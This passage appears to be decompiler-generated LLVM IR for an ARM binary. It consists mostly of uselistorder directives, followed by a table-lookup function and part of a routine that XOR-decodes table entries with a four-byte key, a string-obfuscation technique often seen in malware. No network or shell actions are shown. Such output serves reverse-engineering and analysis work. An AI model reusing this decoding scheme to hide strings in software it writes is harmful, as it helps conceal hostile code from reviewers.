  uselistorder i32 %v1_ed90, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ed90, { 0, 2, 1 }
  uselistorder i32 %v1_ed80, { 1, 0 }
  uselistorder i32 %v3_ee4c, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v1_ece0, { 1, 0 }
  uselistorder i32 %v1_ecc8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ecd4, { 0, 3, 2, 1 }
  uselistorder i32 %v0_ec84, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_ec78, { 2, 1, 0 }
  uselistorder i32 %v1_ec58, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_ec34, { 1, 0 }
  uselistorder i1 %v9_ec00, { 1, 0 }
  uselistorder i32 %v0_ebb0, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eb54, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_eb04, { 1, 0 }
  uselistorder i32 %v5_ea9c, { 1, 0 }
  uselistorder i32 %v3_ea8c, { 1, 2, 0 }
  uselistorder i16 %v4_ea88, { 1, 0 }
  uselistorder i32 %v3_ea88, { 1, 0 }
  uselistorder i1 %v2_e9c4, { 1, 0 }
  uselistorder i1 %v2_e9b0, { 1, 0 }
  uselistorder i1 %v2_e99c, { 1, 0 }
  uselistorder i32 %.464, { 2, 1, 0 }
  uselistorder i1 %v7_e978, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_e960, { 1, 0 }
  uselistorder i1 %v3_e944, { 1, 0, 2 }
  uselistorder i1 %v2_e930, { 1, 0 }
  uselistorder i1 %v2_e90c, { 1, 0 }
  uselistorder i32 %v1_e8bc, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e8a8, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e8a4, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_e88c, { 1, 0 }
  uselistorder i32 %stack_var_-1876.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e874, { 1, 0, 2 }
  uselistorder i32 %v2_f9a4, { 1, 2, 0 }
  uselistorder i32 %v2_f7e8, { 0, 2, 1, 4, 11, 12, 10, 7, 9, 8, 6, 5, 3 }
  uselistorder i32 %v2_f890, { 1, 0 }
  uselistorder i32 %v2_ee58, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_e84c, { 0, 3, 6, 5, 7, 1, 2, 4, 8 }
  uselistorder i32 %v4_e71c, { 2, 1, 0, 3 }
  uselistorder i16 %v5_e6b0.le, { 1, 0 }
  uselistorder i32 %v0_e694, { 3, 2, 0, 1 }
  uselistorder i32 %v2_e668, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v7_e634, { 1, 0 }
  uselistorder i32 %v3_e62c, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_e618, { 1, 0 }
  uselistorder i32 %v2_e5fc, { 1, 0, 2 }
  uselistorder i32 %v0_e5e8, { 1, 2, 0 }
  uselistorder i32 %storemerge329, { 1, 0 }
  uselistorder i32 %v0_e55c, { 3, 1, 2, 0, 4 }
  uselistorder i8* %stack_var_-56, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 0, 11, 12, 13, 9, 14, 15, 1, 2, 16, 3, 17, 6, 18, 4, 19, 5, 20, 7, 21, 8, 22, 10, 23 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 6, 3, 0, 1, 2, 5, 4, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 77, 79, 80, 81, 83, 82, 84, 85, 35, 122, 61, 62, 0, 1, 2, 36, 37, 38, 39, 40, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 63, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 113, 112, 109, 114, 164, 165, 115, 116, 163, 117, 118, 119, 120, 121, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 162, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 146, 145, 148, 147, 156, 149, 150, 151, 152, 153, 154, 155, 157, 158, 159, 160, 161 }
  uselistorder i32* %r2.global-to-local, { 42, 43, 44, 45, 46, 47, 48, 35, 36, 37, 49, 50, 51, 52, 23, 38, 39, 0, 1, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 40, 41, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 112, 113, 68, 69, 71, 70, 67, 114, 72, 115, 73, 116, 117, 74, 75, 76, 77, 78, 79, 80, 81, 82, 65, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 118, 103, 104, 105, 106, 107, 108, 109, 110, 111 }
  uselistorder i32* %r1.global-to-local, { 51, 52, 53, 54, 55, 56, 57, 43, 45, 44, 46, 58, 59, 60, 61, 62, 30, 47, 48, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 0, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 108, 109, 49, 50, 63, 64, 65, 66, 67, 68, 69, 71, 72, 73, 70, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107 }
  uselistorder i32* %r0.global-to-local, { 109, 108, 110, 111, 112, 114, 113, 115, 116, 117, 118, 120, 121, 119, 83, 82, 84, 86, 85, 87, 88, 89, 91, 90, 23, 25, 125, 122, 1, 3, 2, 4, 123, 124, 126, 128, 127, 92, 130, 59, 61, 60, 94, 93, 95, 96, 97, 99, 98, 100, 26, 6, 5, 8, 7, 10, 9, 11, 62, 13, 12, 14, 16, 15, 18, 17, 19, 20, 21, 22, 28, 27, 30, 29, 0, 24, 32, 31, 33, 34, 35, 37, 36, 39, 38, 41, 40, 42, 44, 43, 45, 47, 46, 49, 48, 50, 51, 53, 52, 55, 54, 57, 56, 58, 64, 63, 65, 67, 66, 69, 68, 71, 70, 72, 74, 76, 75, 78, 77, 80, 79, 81, 102, 104, 103, 105, 101, 106, 107, 143, 129, 133, 131, 132, 138, 134, 135, 179, 136, 137, 139, 141, 140, 142, 144, 149, 145, 148, 146, 147, 152, 150, 151, 155, 153, 154, 157, 156, 73, 195, 159, 158, 160, 162, 161, 164, 163, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 196, 180, 181, 182, 184, 183, 185, 190, 186, 187, 188, 189, 191, 192, 193, 194 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 22, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 115, 116, 140, 238, 239, 1, 235, 236, 127, 128, 117, 102, 119, 121, 122, 65, 66, 67, 68, 69, 0, 118, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 120, 17, 18, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 32, 33, 34, 29, 30, 31, 35, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 70, 71, 72, 73, 74, 76, 77, 78, 79, 81, 82, 83, 85, 86, 224, 92, 94, 95, 89, 90, 91, 96, 97, 98, 99, 100, 101, 106, 107, 108, 103, 104, 105, 109, 110, 111, 112, 113, 114, 123, 124, 125, 126, 129, 131, 130, 132, 133, 134, 135, 136, 137, 138, 139, 225, 226, 141, 142, 143, 144, 145, 147, 146, 148, 149, 150, 153, 155, 156, 154, 151, 152, 234, 233, 231, 157, 232, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 93, 196, 197, 88, 198, 199, 87, 200, 201, 202, 203, 204, 205, 84, 206, 207, 208, 209, 210, 80, 211, 212, 213, 75, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 227, 228, 229, 237, 230 }
  uselistorder i1* %cpsr_c.global-to-local, { 114, 115, 137, 0, 232, 2, 124, 229, 230, 125, 116, 101, 117, 119, 120, 66, 67, 68, 69, 1, 99, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 118, 18, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29, 33, 34, 35, 30, 31, 32, 36, 37, 38, 39, 40, 41, 45, 46, 47, 42, 43, 44, 48, 49, 50, 51, 52, 53, 57, 58, 59, 54, 55, 56, 60, 61, 62, 63, 64, 65, 70, 71, 73, 74, 76, 77, 78, 79, 81, 82, 84, 85, 218, 91, 92, 93, 88, 89, 90, 94, 95, 96, 97, 98, 100, 105, 106, 107, 102, 103, 104, 108, 109, 110, 111, 112, 113, 121, 122, 123, 126, 128, 127, 129, 130, 131, 132, 133, 134, 135, 136, 219, 220, 138, 139, 140, 141, 142, 143, 144, 145, 148, 150, 151, 149, 146, 147, 228, 227, 225, 152, 226, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 87, 189, 190, 86, 191, 192, 83, 193, 194, 195, 196, 197, 198, 80, 199, 200, 201, 202, 203, 75, 204, 205, 206, 72, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 221, 222, 223, 231, 224 }
  uselistorder i32 (i32)* @function_11344, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_16180.75 to i32), { 0, 2, 1, 3 }
  uselistorder i16* bitcast (i16** @global_var_1ea24.127 to i16*), { 1, 0 }
  uselistorder i16** @global_var_1ea24.127, { 1, 0 }
  uselistorder i32 ptrtoint (i16** @global_var_1ea24.127 to i32), { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1144c, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 8, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), { 5, 7, 6, 8, 2, 9, 0, 10, 1, 11, 3, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @function_11538, { 14, 13, 12, 11, 10, 9, 8, 20, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 17, 16, 15, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 11 }
  uselistorder i8 34, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 4, 5, 14, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 17, 18, 19, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 62, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 61, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @function_fcc4, { 28, 41, 40, 27, 34, 39, 38, 37, 36, 35, 33, 32, 31, 30, 29, 26, 2, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_103d4, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32*)* @function_fca0, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 34, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37 }
  uselistorder i32 (i32)* @function_fd64, { 23, 22, 31, 30, 29, 28, 27, 26, 25, 24, 21, 3, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_114c4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_10b00, { 1, 0 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_e328, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_114fc, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_11570, { 9, 8, 7, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_c898, { 9, 8, 7, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_1ea10.182, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1ea0c.140 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @function_c848, { 11, 10, 9, 2, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i16* bitcast (i32* @global_var_1ea02.179 to i16*), { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 21, 22, 19, 20, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 62, { 2, 1, 0 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_16204.173 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_161fc.171 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_161c0.159 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @function_e3f0, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_161a0.149 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_1ea19.146, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 2, 0, 3, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_1ea0c.140, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_1ea0c.140 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_1ea18.141, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_1e9f8.137, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @function_e0b8, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 14, 13, 12, 11, 10, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_115b0, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 2048, { 5, 4, 1, 2, 3, 6, 7, 0, 8, 9 }
  uselistorder i32* @global_var_20a7c.135, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_20a78.133, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_1ea28.121, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32)* @function_e114, { 1, 0 }
  uselistorder i32* @global_var_20a5c.46, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_20a5c.46 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @function_105d8, { 2, 1, 0 }
  uselistorder i32 ()* @function_10acc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fbfc, { 1, 0 }
  uselistorder label %dec_label_pc_fbf4, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_fbe8, { 1, 0 }
  uselistorder label %dec_label_pc_ef38.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ef38.backedge.thread561, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_ef38.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f9d8, { 1, 0 }
  uselistorder label %dec_label_pc_f938, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_f900, { 1, 0 }
  uselistorder label %dec_label_pc_f8ec, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f8dc, { 1, 0 }
  uselistorder label %dec_label_pc_f7cc, { 1, 0 }
  uselistorder label %dec_label_pc_f74c, { 5, 3, 4, 2, 6, 1, 0 }
  uselistorder label %dec_label_pc_f718, { 1, 0 }
  uselistorder label %thread-pre-split124, { 1, 0 }
  uselistorder label %dec_label_pc_f6c8, { 1, 0 }
  uselistorder label %dec_label_pc_f60c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f5f4, { 1, 0 }
  uselistorder label %dec_label_pc_f4c0, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f4a8, { 1, 0 }
  uselistorder label %dec_label_pc_f3ec, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f3d4, { 1, 0 }
  uselistorder label %dec_label_pc_f360, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread103, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f32c, { 1, 0 }
  uselistorder label %.thread99, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f30c, { 1, 0 }
  uselistorder label %dec_label_pc_f2f8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f2b4, { 1, 0 }
  uselistorder label %dec_label_pc_f2b4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f248, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f230, { 1, 0 }
  uselistorder label %dec_label_pc_f174, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f15c, { 1, 0 }
  uselistorder label %dec_label_pc_f03c, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb424, { 1, 0 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %dec_label_pc_f004, { 1, 0 }
  uselistorder label %dec_label_pc_ef9c, { 1, 0 }
  uselistorder label %.thread82, { 1, 0 }
  uselistorder label %dec_label_pc_ef50, { 1, 0 }
  uselistorder label %dec_label_pc_ef40, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ef40.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ef1c, { 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_ee40, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_ed34.dec_label_pc_ed34_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed04, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ecec, { 1, 0 }
  uselistorder label %dec_label_pc_ecc8, { 1, 0 }
  uselistorder label %dec_label_pc_eb7c, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_eb68, { 1, 0 }
  uselistorder label %bb407, { 1, 0 }
  uselistorder label %dec_label_pc_e9fc, { 1, 0 }
  uselistorder label %dec_label_pc_e9f0, { 1, 0 }
  uselistorder label %dec_label_pc_e9e4, { 1, 0 }
  uselistorder label %dec_label_pc_e9d8, { 1, 0 }
  uselistorder label %dec_label_pc_e9cc, { 1, 0 }
  uselistorder label %dec_label_pc_e9b8, { 1, 0 }
  uselistorder label %dec_label_pc_e9a4, { 1, 0 }
  uselistorder label %dec_label_pc_e990, { 1, 0 }
  uselistorder label %dec_label_pc_e970, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e94c, { 1, 0 }
  uselistorder label %dec_label_pc_e940, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e91c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e8f8, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_e8a4, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_e694, { 1, 0 }
}

define i32 @function_fca0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_fca0:
  store i32 ptrtoint (i32* @global_var_20a88.197 to i32), i32* @r2, align 4
  %v3_fca4 = mul i32 %arg1, 8
  %v2_fca8 = add i32 %v3_fca4, ptrtoint (i32* @global_var_20a88.197 to i32)
  store i32 %v2_fca8, i32* @r3, align 4
  %v2_fcac = icmp eq i32* %arg2, null
  br i1 %v2_fcac, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_fca0
  %v3_fcb44 = inttoptr i32 %v2_fca8 to i32*
  %v4_fcb45 = load i32, i32* %v3_fcb44, align 4
  br label %bb7

bb:                                               ; preds = %dec_label_pc_fca0
  %v2_fcb0 = add i32 %v3_fca4, add (i32 ptrtoint (i32* @global_var_20a88.197 to i32), i32 4)
  %v3_fcb0 = inttoptr i32 %v2_fcb0 to i16*
  %v4_fcb0 = load i16, i16* %v3_fcb0, align 4
  %v5_fcb0 = zext i16 %v4_fcb0 to i32
  store i32 %v5_fcb0, i32* @r3, align 4
  %v3_fcb4 = inttoptr i32 %v2_fca8 to i32*
  %v4_fcb4 = load i32, i32* %v3_fcb4, align 4
  store i32 %v5_fcb0, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_fcb46 = phi i32 [ %v4_fcb45, %.thread ], [ %v4_fcb4, %bb ]
  ret i32 %v4_fcb46

; uselistorder directives
  uselistorder i32 %v2_fca8, { 1, 0, 2 }
  uselistorder i32 %v3_fca4, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_fcc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_fcc4:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fccc = mul i32 %arg1, 8
  %v2_fcd0 = add i32 %v3_fccc, ptrtoint (i32* @global_var_20a88.197 to i32)
  %v2_fcd4 = load i32, i32* inttoptr (i32 124952 to i32*), align 8
  %v1_fcd8 = add i32 %v3_fccc, add (i32 ptrtoint (i32* @global_var_20a88.197 to i32), i32 4)
  %v2_fcd8 = inttoptr i32 %v1_fcd8 to i16*
  %v3_fcd8 = load i16, i16* %v2_fcd8, align 4
  %v3_fcdc = udiv i32 %v2_fcd4, 256
  %v2_fce0 = icmp eq i16 %v3_fcd8, 0
  store i1 %v2_fce0, i1* @cpsr_z, align 1
  %v3_fce4 = udiv i32 %v2_fcd4, 65536
  store i32 %v3_fce4, i32* @r3, align 4
  %v3_fce8 = load i32, i32* @r4, align 4
  store i32 %v3_fce8, i32* %stack_var_-16, align 4
  %v1_fcec = urem i32 %v3_fcdc, 256
  store i32 %v1_fcec, i32* %r6.global-to-local, align 4
  %v1_fcf0 = urem i32 %v3_fce4, 256
  store i32 %v1_fcf0, i32* %r5.global-to-local, align 4
  %v3_fcf4 = udiv i32 %v2_fcd4, 16777216
  store i32 %v3_fcf4, i32* %r4.global-to-local, align 4
  %v1_fcf8 = urem i32 %v2_fcd4, 256
  store i32 %v1_fcf8, i32* %lr.global-to-local, align 4
  br i1 %v2_fce0, label %dec_label_pc_fd54, label %dec_label_pc_fd00

dec_label_pc_fd00:                                ; preds = %dec_label_pc_fcc4
  store i32 0, i32* @ip, align 4
  %v1_fd04 = inttoptr i32 %v2_fcd0 to i32*
  br label %dec_label_pc_fd04

dec_label_pc_fd04:                                ; preds = %dec_label_pc_fd04.dec_label_pc_fd04_crit_edge, %dec_label_pc_fd00
  %v0_fd0c = phi i32 [ %v0_fd0c.pre, %dec_label_pc_fd04.dec_label_pc_fd04_crit_edge ], [ %v1_fcf8, %dec_label_pc_fd00 ]
  %v2_fd10 = phi i32 [ %v1_fd48, %dec_label_pc_fd04.dec_label_pc_fd04_crit_edge ], [ 0, %dec_label_pc_fd00 ]
  %v2_fd04 = load i32, i32* %v1_fd04, align 4
  %v2_fd08 = add i32 %v2_fd04, %v2_fd10
  %v3_fd08 = inttoptr i32 %v2_fd08 to i8*
  %v4_fd08 = load i8, i8* %v3_fd08, align 1
  %v6_fd08 = zext i8 %v4_fd08 to i32
  %v2_fd0c = xor i32 %v6_fd08, %v0_fd0c
  %v1_fd10 = trunc i32 %v2_fd0c to i8
  store i8 %v1_fd10, i8* %v3_fd08, align 1
  %v2_fd14 = load i32, i32* %v1_fd04, align 4
  %v0_fd18 = load i32, i32* @ip, align 4
  %v2_fd18 = add i32 %v0_fd18, %v2_fd14
  %v3_fd18 = inttoptr i32 %v2_fd18 to i8*
  %v4_fd18 = load i8, i8* %v3_fd18, align 1
  %v6_fd18 = zext i8 %v4_fd18 to i32
  %v0_fd1c = load i32, i32* %r6.global-to-local, align 4
  %v2_fd1c = xor i32 %v0_fd1c, %v6_fd18
  %v1_fd20 = trunc i32 %v2_fd1c to i8
  store i8 %v1_fd20, i8* %v3_fd18, align 1
  %v2_fd24 = load i32, i32* %v1_fd04, align 4
  %v0_fd28 = load i32, i32* @ip, align 4
  %v2_fd28 = add i32 %v0_fd28, %v2_fd24
  %v3_fd28 = inttoptr i32 %v2_fd28 to i8*
  %v4_fd28 = load i8, i8* %v3_fd28, align 1
  %v6_fd28 = zext i8 %v4_fd28 to i32
  %v0_fd2c = load i32, i32* %r5.global-to-local, align 4
  %v2_fd2c = xor i32 %v0_fd2c, %v6_fd28
